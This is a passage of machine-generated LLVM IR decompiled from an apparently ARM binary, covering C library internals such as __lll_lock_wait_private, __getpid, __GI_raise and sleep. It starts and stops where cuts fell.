  uselistorder i1* %cpsr_c.global-to-local, { 2, 10, 4, 5, 6, 8, 7, 1, 9, 11, 12, 13, 27, 28, 14, 15, 16, 29, 30, 17, 18, 20, 19, 0, 21, 22, 23, 24, 31, 32, 26, 25, 3 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_139f4, { 1, 0 }
  uselistorder label %dec_label_pc_139e8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_139b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13998, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_13934, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1391c, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_137ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13794, { 1, 0 }
  uselistorder label %dec_label_pc_13740, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13728, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_136cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_136b4, { 1, 0 }
  uselistorder label %dec_label_pc_13750.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_13680, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13a2c = load i32, i32* @r4, align 4
  store i32 %v3_13a2c, i32* %stack_var_-16, align 4
  %v0_13a30 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13a30, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13a34

dec_label_pc_13a34:                               ; preds = %dec_label_pc_13ab4.dec_label_pc_13a34_crit_edge, %entry
  %v0_13a38 = phi i32 [ %v0_13a38.pre, %dec_label_pc_13ab4.dec_label_pc_13a34_crit_edge ], [ %v0_13a30, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_13a38, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_13a4017 = inttoptr i32 %v0_13a38 to i32*
  %v2_13a4018 = load i32, i32* %v1_13a4017, align 4
  %v3_13a4420 = icmp ne i32 %v2_13a4018, 0
  store i1 %v3_13a4420, i1* %cpsr_c.global-to-local, align 1
  %v9_13a4426 = icmp eq i32 %v2_13a4018, 1
  br i1 %v9_13a4426, label %dec_label_pc_13a4c, label %dec_label_pc_13a64

dec_label_pc_13a4c:                               ; preds = %dec_label_pc_13a34, %dec_label_pc_13a4c.dec_label_pc_13a40_crit_edge
  %v0_13a4c27 = phi i32 [ %v1_13a44.pre, %dec_label_pc_13a4c.dec_label_pc_13a40_crit_edge ], [ 1, %dec_label_pc_13a34 ]
  store i32 %v0_13a4c27, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13a5c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13a5c, label %dec_label_pc_13a60, label %dec_label_pc_13a4c.dec_label_pc_13a40_crit_edge

dec_label_pc_13a4c.dec_label_pc_13a40_crit_edge:  ; preds = %dec_label_pc_13a4c
  %v0_13a40.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13a44.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13a40 = inttoptr i32 %v0_13a40.pre to i32*
  %v2_13a40 = load i32, i32* %v1_13a40, align 4
  %v3_13a44 = icmp uge i32 %v2_13a40, %v1_13a44.pre
  store i1 %v3_13a44, i1* %cpsr_c.global-to-local, align 1
  %v9_13a44 = icmp eq i32 %v2_13a40, %v1_13a44.pre
  br i1 %v9_13a44, label %dec_label_pc_13a4c, label %dec_label_pc_13a64

dec_label_pc_13a60:                               ; preds = %dec_label_pc_13a4c
  %v0_13a60 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a64

dec_label_pc_13a64:                               ; preds = %dec_label_pc_13a34, %dec_label_pc_13a4c.dec_label_pc_13a40_crit_edge, %dec_label_pc_13a60
  %v0_13a64 = phi i32 [ %v0_13a60, %dec_label_pc_13a60 ], [ %v2_13a4018, %dec_label_pc_13a34 ], [ %v2_13a40, %dec_label_pc_13a4c.dec_label_pc_13a40_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13a64 = icmp eq i32 %v0_13a64, 0
  %v0_13a88.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_13a64, label %dec_label_pc_13a84, label %dec_label_pc_13a6c

dec_label_pc_13a6c:                               ; preds = %dec_label_pc_13a64
  store i32 %v0_13a88.pre, i32* %r0.global-to-local, align 4
  %v0_13a70 = load i32, i32* %r1.global-to-local, align 4
  %v1_13a70 = add i32 %v0_13a70, 126
  store i32 %v1_13a70, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13a84

dec_label_pc_13a84:                               ; preds = %dec_label_pc_13a64, %dec_label_pc_13a6c
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_13a88.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_13a9028 = inttoptr i32 %v0_13a88.pre to i32*
  %v2_13a9029 = load i32, i32* %v1_13a9028, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_13a9436 = icmp eq i32 %v2_13a9029, 0
  br i1 %v9_13a9436, label %dec_label_pc_13a9c, label %dec_label_pc_13ab4

dec_label_pc_13a9c:                               ; preds = %dec_label_pc_13a84, %dec_label_pc_13a9c.dec_label_pc_13a90_crit_edge
  %v0_13a9c37 = phi i32 [ %v1_13a94.pre, %dec_label_pc_13a9c.dec_label_pc_13a90_crit_edge ], [ 0, %dec_label_pc_13a84 ]
  store i32 %v0_13a9c37, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13aac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13aac, label %dec_label_pc_13ab0, label %dec_label_pc_13a9c.dec_label_pc_13a90_crit_edge

dec_label_pc_13a9c.dec_label_pc_13a90_crit_edge:  ; preds = %dec_label_pc_13a9c
  %v0_13a90.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13a94.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13a90 = inttoptr i32 %v0_13a90.pre to i32*
  %v2_13a90 = load i32, i32* %v1_13a90, align 4
  %v3_13a94 = icmp uge i32 %v2_13a90, %v1_13a94.pre
  store i1 %v3_13a94, i1* %cpsr_c.global-to-local, align 1
  %v9_13a94 = icmp eq i32 %v2_13a90, %v1_13a94.pre
  br i1 %v9_13a94, label %dec_label_pc_13a9c, label %dec_label_pc_13ab4

dec_label_pc_13ab0:                               ; preds = %dec_label_pc_13a9c
  %v0_13ab0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13ab4

dec_label_pc_13ab4:                               ; preds = %dec_label_pc_13a84, %dec_label_pc_13a9c.dec_label_pc_13a90_crit_edge, %dec_label_pc_13ab0
  %v0_13ab4 = phi i32 [ %v0_13ab0, %dec_label_pc_13ab0 ], [ %v2_13a9029, %dec_label_pc_13a84 ], [ %v2_13a90, %dec_label_pc_13a9c.dec_label_pc_13a90_crit_edge ]
  %v1_13ab4 = phi i32 [ %v0_13ab0, %dec_label_pc_13ab0 ], [ 0, %dec_label_pc_13a84 ], [ %v1_13a94.pre, %dec_label_pc_13a9c.dec_label_pc_13a90_crit_edge ]
  %v3_13ab4 = icmp uge i32 %v0_13ab4, %v1_13ab4
  store i1 %v3_13ab4, i1* %cpsr_c.global-to-local, align 1
  %v9_13ab4 = icmp eq i32 %v0_13ab4, %v1_13ab4
  br i1 %v9_13ab4, label %dec_label_pc_13abc, label %dec_label_pc_13ab4.dec_label_pc_13a34_crit_edge

dec_label_pc_13ab4.dec_label_pc_13a34_crit_edge:  ; preds = %dec_label_pc_13ab4
  %v0_13a38.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13a34

dec_label_pc_13abc:                               ; preds = %dec_label_pc_13ab4
  %v2_13abc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13abc, i32* %r4.global-to-local, align 4
  %v1_13ac0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13ac0

; uselistorder directives
  uselistorder i32 %v0_13ab0, { 1, 0 }
  uselistorder i32 %v1_13a94.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_13a44.pre, { 2, 1, 0 }
  uselistorder i32 %v2_13a4018, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder i32 126, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13ab4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13a9c, { 1, 0 }
  uselistorder label %dec_label_pc_13a84, { 1, 0 }
  uselistorder label %dec_label_pc_13a64, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13a4c, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ac4 = load i32, i32* @r7, align 4
  store i32 %v3_13ac4, i32* %stack_var_-8, align 4
  %v0_13ac8 = call i32 @__aeabi_read_tp()
  store i32 %v0_13ac8, i32* %r0.global-to-local, align 4
  %v1_13acc = add i32 %v0_13ac8, -1060
  %v2_13acc = inttoptr i32 %v1_13acc to i32*
  %v3_13acc = load i32, i32* %v2_13acc, align 4
  %tmp7 = icmp slt i32 %v3_13acc, 1
  br i1 %tmp7, label %dec_label_pc_13adc, label %dec_label_pc_13b00

dec_label_pc_13adc:                               ; preds = %entry
  %v2_13ad0 = icmp eq i32 %v3_13acc, 0
  br i1 %v2_13ad0, label %dec_label_pc_13ae0, label %dec_label_pc_13aec

dec_label_pc_13ae0:                               ; preds = %dec_label_pc_13adc
  %v1_13ae0 = add i32 %v0_13ac8, -1064
  %v2_13ae0 = inttoptr i32 %v1_13ae0 to i32*
  %v3_13ae0 = load i32, i32* %v2_13ae0, align 4
  store i32 %v3_13ae0, i32* %r0.global-to-local, align 4
  %v2_13ae4 = icmp eq i32 %v3_13ae0, 0
  br i1 %v2_13ae4, label %bb, label %bb8

dec_label_pc_13aec:                               ; preds = %dec_label_pc_13adc
  br label %bb8

bb:                                               ; preds = %dec_label_pc_13ae0
  store i32 0, i32* %v2_13ae0, align 4
  %v0_13afc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_13aec, %dec_label_pc_13ae0, %bb
  %v0_13afc = phi i32 [ %v3_13ae0, %dec_label_pc_13ae0 ], [ %v0_13ac8, %dec_label_pc_13aec ], [ %v0_13afc.pre, %bb ]
  br label %dec_label_pc_13b00

dec_label_pc_13b00:                               ; preds = %entry, %bb8
  %v0_13b00 = phi i32 [ %v3_13acc, %entry ], [ %v0_13afc, %bb8 ]
  store i32 %v0_13b00, i32* %r0.global-to-local, align 4
  %v2_13b04 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13b04, i32* @r7, align 4
  ret i32 %v0_13b00

; uselistorder directives
  uselistorder i32 %v0_13b00, { 1, 0 }
  uselistorder i32 %v3_13acc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13b00, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13b0c = load i32, i32* @r4, align 4
  store i32 %v3_13b0c, i32* %stack_var_-20, align 4
  %v0_13b14 = call i32 @__aeabi_read_tp()
  store i32 %v0_13b14, i32* %r0.global-to-local, align 4
  %v1_13b18 = add i32 %v0_13b14, -1064
  %v2_13b18 = inttoptr i32 %v1_13b18 to i32*
  %v3_13b18 = load i32, i32* %v2_13b18, align 4
  store i32 %v3_13b18, i32* %r4.global-to-local, align 4
  %v2_13b1c = icmp eq i32 %v3_13b18, 0
  %v1_13b24 = add i32 %v0_13b14, -1060
  %v2_13b24 = inttoptr i32 %v1_13b24 to i32*
  %v3_13b24 = load i32, i32* %v2_13b24, align 4
  store i32 %v3_13b24, i32* %r0.global-to-local, align 4
  br i1 %v2_13b1c, label %dec_label_pc_13b2c, label %dec_label_pc_13b40

dec_label_pc_13b2c:                               ; preds = %entry
  store i32 %v3_13b24, i32* %r4.global-to-local, align 4
  store i32 %v3_13b24, i32* %v2_13b18, align 4
  %v0_13b68.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_13b40:                               ; preds = %entry
  %v5_13b44 = icmp sgt i32 %v3_13b24, 0
  br i1 %v5_13b44, label %bb28, label %dec_label_pc_13b48

dec_label_pc_13b48:                               ; preds = %dec_label_pc_13b40
  %tmp = bitcast i32 %v3_13b24 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_13b48 = bitcast float %tmp30 to i32
  %v2_13b4c = icmp eq i32 %v1_13b48, 0
  br i1 %v2_13b4c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13b48
  store i32 %v3_13b18, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_13b48
  %v2_13b54 = sub i32 0, %v3_13b24
  store i32 %v2_13b54, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_13b40, %dec_label_pc_13b2c, %.thread
  %v0_13b6c = phi i32 [ %v3_13b24, %dec_label_pc_13b40 ], [ %v0_13b68.pre, %dec_label_pc_13b2c ], [ %v3_13b18, %bb ], [ %v2_13b54, %.thread ]
  store i32 %v0_13b6c, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_13b6c, -4095
  br i1 %tmp31, label %dec_label_pc_13b90, label %dec_label_pc_13b78

dec_label_pc_13b78:                               ; preds = %bb28
  %v0_13b7c = call i32 @__aeabi_read_tp()
  %v3_13b80 = load i16, i16* @global_var_21510.336, align 2
  %v4_13b80 = sext i16 %v3_13b80 to i32
  %v0_13b84 = load i32, i32* %r2.global-to-local, align 4
  %v1_13b84 = sub i32 0, %v0_13b84
  store i32 %v1_13b84, i32* %r2.global-to-local, align 4
  %v3_13b88 = add i32 %v4_13b80, %v0_13b7c
  %v4_13b88 = inttoptr i32 %v3_13b88 to i32*
  store i32 %v1_13b84, i32* %v4_13b88, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13b90

dec_label_pc_13b90:                               ; preds = %bb28, %dec_label_pc_13b78
  %v0_13b94 = phi i32 [ %v0_13b6c, %bb28 ], [ -1, %dec_label_pc_13b78 ]
  %v3_13b90 = icmp eq i32 %v0_13b94, -1
  store i32 %v0_13b94, i32* %r5.global-to-local, align 4
  br i1 %v3_13b90, label %dec_label_pc_13b9c, label %dec_label_pc_13be4

dec_label_pc_13b9c:                               ; preds = %dec_label_pc_13b90
  %v0_13ba0 = call i32 @__aeabi_read_tp()
  store i32 %v0_13ba0, i32* %r0.global-to-local, align 4
  %v3_13ba4 = load i16, i16* @global_var_21510.336, align 2
  %v4_13ba4 = sext i16 %v3_13ba4 to i32
  %v2_13ba8 = add i32 %v4_13ba4, %v0_13ba0
  %v3_13ba8 = inttoptr i32 %v2_13ba8 to i32*
  %v4_13ba8 = load i32, i32* %v3_13ba8, align 4
  %v7_13bac = icmp eq i32 %v4_13ba8, 38
  br i1 %v7_13bac, label %dec_label_pc_13bb8, label %dec_label_pc_13b9c.dec_label_pc_13be4_crit_edge

dec_label_pc_13b9c.dec_label_pc_13be4_crit_edge:  ; preds = %dec_label_pc_13b9c
  %v0_13be4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13be4

dec_label_pc_13bb8:                               ; preds = %dec_label_pc_13b9c
  %v0_13bb8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13bb8, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_13bb8, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_13bb8
  %v5_13bd0 = sub i32 0, %v0_13bb8
  store i32 %v5_13bd0, i32* %r2.global-to-local, align 4
  %v7_13bd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_13bdc.508 to i32), i32 55604) to i32*), align 4
  %v4_13bd8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_13bd8, i32* %r0.global-to-local, align 4
  %v7_13bdc = add i32 %v7_13bd4, %v0_13ba0
  %v8_13bdc = inttoptr i32 %v7_13bdc to i32*
  store i32 %v5_13bd0, i32* %v8_13bdc, align 4
  %v0_13be0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_13bb8, %bb29
  %v0_13be0 = phi i32 [ %v0_13be0.pre, %bb29 ], [ %v0_13bb8, %dec_label_pc_13bb8 ]
  store i32 %v0_13be0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13be4

dec_label_pc_13be4:                               ; preds = %dec_label_pc_13b9c.dec_label_pc_13be4_crit_edge, %dec_label_pc_13b90, %.thread22
  %v0_13be4 = phi i32 [ %v0_13be4.pre, %dec_label_pc_13b9c.dec_label_pc_13be4_crit_edge ], [ %v0_13b94, %dec_label_pc_13b90 ], [ %v0_13be0, %.thread22 ]
  store i32 %v0_13be4, i32* %r0.global-to-local, align 4
  %v2_13be8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13be8, i32* @r4, align 4
  ret i32 %v0_13be4

; uselistorder directives
  uselistorder i32 %v0_13be4, { 1, 0 }
  uselistorder i32 %v0_13bb8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13b6c, { 2, 0, 1 }
  uselistorder i32 %v3_13b24, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_13be4, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_13b90, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_13bfc = load i32, i32* @r4, align 4
  %v6_13bfc = load i32, i32* @r5, align 4
  %v9_13bfc = load i32, i32* @r6, align 4
  %v12_13bfc = load i32, i32* @r7, align 4
  %v15_13bfc = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13c0c = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_13c0c, label %dec_label_pc_13c20, label %dec_label_pc_13c94

dec_label_pc_13c20:                               ; preds = %entry
  %v0_13c20 = call i32 @__aeabi_read_tp()
  %v1_13c24 = add i32 %v0_13c20, -1036
  %v2_13c24 = inttoptr i32 %v1_13c24 to i32*
  %v3_13c24 = load i32, i32* %v2_13c24, align 4
  %v1_13c28 = and i32 %v3_13c24, -71
  %v2_13c2c = icmp ugt i32 %v1_13c28, 7
  store i1 %v2_13c2c, i1* %cpsr_c.global-to-local, align 1
  %v7_13c2c = icmp eq i32 %v1_13c28, 8
  %v1_13c30 = add i32 %v0_13c20, -1168
  store i32 %v1_13c30, i32* @r5, align 4
  br i1 %v7_13c2c, label %dec_label_pc_13c38, label %dec_label_pc_13d0c

dec_label_pc_13c38:                               ; preds = %dec_label_pc_13c20
  %v2_13c3c = add i32 %v0_13c20, -624
  %v3_13c3c = inttoptr i32 %v2_13c3c to i32*
  store i32 -1, i32* %v3_13c3c, align 4
  %v0_13c40 = load i32, i32* @r5, align 4
  %v1_13c40 = add i32 %v0_13c40, 132
  store i32 %v1_13c40, i32* @r6, align 4
  br label %dec_label_pc_13c44

dec_label_pc_13c44:                               ; preds = %dec_label_pc_13c78.dec_label_pc_13c44_crit_edge, %dec_label_pc_13c38
  %v0_13c48 = phi i32 [ %v0_13c48.pre, %dec_label_pc_13c78.dec_label_pc_13c44_crit_edge ], [ %v1_13c40, %dec_label_pc_13c38 ]
  %v0_13c44 = phi i32 [ %v0_13c80, %dec_label_pc_13c78.dec_label_pc_13c44_crit_edge ], [ %v0_13c40, %dec_label_pc_13c38 ]
  %v1_13c44 = add i32 %v0_13c44, 132
  %v2_13c44 = inttoptr i32 %v1_13c44 to i32*
  %v3_13c44 = load i32, i32* %v2_13c44, align 4
  store i32 %v0_13c48, i32* %r2.global-to-local, align 4
  store i32 %v3_13c44, i32* @r4, align 4
  %v1_13c5430 = inttoptr i32 %v0_13c48 to i32*
  %v2_13c5431 = load i32, i32* %v1_13c5430, align 4
  %v3_13c5833 = icmp uge i32 %v2_13c5431, %v3_13c44
  store i1 %v3_13c5833, i1* %cpsr_c.global-to-local, align 1
  %v9_13c5839 = icmp eq i32 %v2_13c5431, %v3_13c44
  br i1 %v9_13c5839, label %dec_label_pc_13c60, label %dec_label_pc_13c78

dec_label_pc_13c60:                               ; preds = %dec_label_pc_13c44, %dec_label_pc_13c60.dec_label_pc_13c54_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_13c70 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13c70, label %dec_label_pc_13c74, label %dec_label_pc_13c60.dec_label_pc_13c54_crit_edge

dec_label_pc_13c60.dec_label_pc_13c54_crit_edge:  ; preds = %dec_label_pc_13c60
  %v0_13c54.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13c58.pre = load i32, i32* @r4, align 4
  %v1_13c54 = inttoptr i32 %v0_13c54.pre to i32*
  %v2_13c54 = load i32, i32* %v1_13c54, align 4
  %v3_13c58 = icmp uge i32 %v2_13c54, %v1_13c58.pre
  store i1 %v3_13c58, i1* %cpsr_c.global-to-local, align 1
  %v9_13c58 = icmp eq i32 %v2_13c54, %v1_13c58.pre
  br i1 %v9_13c58, label %dec_label_pc_13c60, label %dec_label_pc_13c78

dec_label_pc_13c74:                               ; preds = %dec_label_pc_13c60
  %v0_13c74 = load i32, i32* @r4, align 4
  br label %dec_label_pc_13c78

dec_label_pc_13c78:                               ; preds = %dec_label_pc_13c44, %dec_label_pc_13c60.dec_label_pc_13c54_crit_edge, %dec_label_pc_13c74
  %v0_13c78 = phi i32 [ %v0_13c74, %dec_label_pc_13c74 ], [ %v2_13c5431, %dec_label_pc_13c44 ], [ %v2_13c54, %dec_label_pc_13c60.dec_label_pc_13c54_crit_edge ]
  %v1_13c78 = phi i32 [ %v0_13c74, %dec_label_pc_13c74 ], [ %v3_13c44, %dec_label_pc_13c44 ], [ %v1_13c58.pre, %dec_label_pc_13c60.dec_label_pc_13c54_crit_edge ]
  %v3_13c78 = icmp uge i32 %v0_13c78, %v1_13c78
  store i1 %v3_13c78, i1* %cpsr_c.global-to-local, align 1
  %v9_13c78 = icmp eq i32 %v0_13c78, %v1_13c78
  br i1 %v9_13c78, label %dec_label_pc_13c80, label %dec_label_pc_13c78.dec_label_pc_13c44_crit_edge

dec_label_pc_13c78.dec_label_pc_13c44_crit_edge:  ; preds = %dec_label_pc_13c78
  %v0_13c80 = load i32, i32* @r5, align 4
  %v0_13c48.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13c44

dec_label_pc_13c80:                               ; preds = %dec_label_pc_13c78
  %v0_13c88 = load i32, i32* @r7, align 4
  %v2_13c88 = add i32 %v0_13c88, 116
  %v3_13c88 = inttoptr i32 %v2_13c88 to i32*
  %v4_13c88 = load i32, i32* %v3_13c88, align 4
  store i32 81044, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13c88)
  %v0_13c9c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13c94

dec_label_pc_13c94:                               ; preds = %entry, %dec_label_pc_13c80
  %v0_13c9c = phi i32 [ 0, %entry ], [ %v0_13c9c.pre, %dec_label_pc_13c80 ]
  %v2_13ca0 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_13ca0, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_13cac = call i32 @__libc_sigaction(i32 17, i32 %v0_13c9c, i32 %v2_13ca0)
  %v3_13cb0 = load i32, i32* %stack_var_-60, align 4
  %v2_13cb4 = icmp ne i32 %v3_13cb0, 0
  store i1 %v2_13cb4, i1* %cpsr_c.global-to-local, align 1
  %v7_13cb4 = icmp eq i32 %v3_13cb0, 1
  br i1 %v7_13cb4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13c94
  %v3_13cb8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_13cb8, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13c94, %bb
  call void @__pseudo_cond_branch(i1 %v7_13cb4, i32 ptrtoint (i32* @global_var_10a08.512 to i32))
  %v2_13cc8 = ptrtoint i32* %stack_var_-32 to i32
  %v2_13cd0 = call i32 @__libc_nanosleep(i32 %v2_13cc8, i32 %v2_13cc8)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13cd4 = icmp eq i32 %v2_13cd0, 0
  br i1 %v2_13cd4, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_13ce8 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_13ce8, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_13cf8 = load i32, i32* %stack_var_-40, align 4
  %v1_13cfc = and i32 %v3_13cf8, 65536
  store i32 %v1_13cfc, i32* %r2.global-to-local, align 4
  %v2_13cfc = icmp eq i32 %v1_13cfc, 0
  br i1 %v2_13cfc, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_13cfc, i32 ptrtoint (i32* @global_var_10a08.512 to i32))
  br label %dec_label_pc_13d0c

dec_label_pc_13d0c:                               ; preds = %dec_label_pc_13c20, %.thread5
  %v0_13d0c = load i32, i32* @r4, align 4
  store i32 %v3_13bfc, i32* @r4, align 4
  store i32 %v6_13bfc, i32* @r5, align 4
  store i32 %v9_13bfc, i32* @r6, align 4
  store i32 %v12_13bfc, i32* @r7, align 4
  store i32 %v15_13bfc, i32* @lr, align 4
  ret i32 %v0_13d0c

; uselistorder directives
  uselistorder i32 %v0_13c74, { 1, 0 }
  uselistorder i32 %v1_13c58.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13d0c, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_13c94, { 1, 0 }
  uselistorder label %dec_label_pc_13c78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13c60, { 1, 0 }
}

define i32 @function_13d20(i32 %arg1) local_unnamed_addr {
dec_label_pc_13d20:
  %v0_13d20 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13d20, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_13d20
  %v2_13d20 = load i32, i32* @r4, align 4
  %v4_13d20 = lshr i32 %v2_13d20, %arg1
  %v5_13d20 = sub i32 32, %arg1
  %v6_13d20 = shl i32 %v2_13d20, %v5_13d20
  %v7_13d20 = or i32 %v6_13d20, %v4_13d20
  %v9_13d20 = and i32 %v7_13d20, %arg1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_13d20, %bb
  %v0_13d24 = phi i32 [ %arg1, %dec_label_pc_13d20 ], [ %v9_13d20, %bb ]
  ret i32 %v0_13d24

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_13d44 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_13d44, label %bb1, label %bb

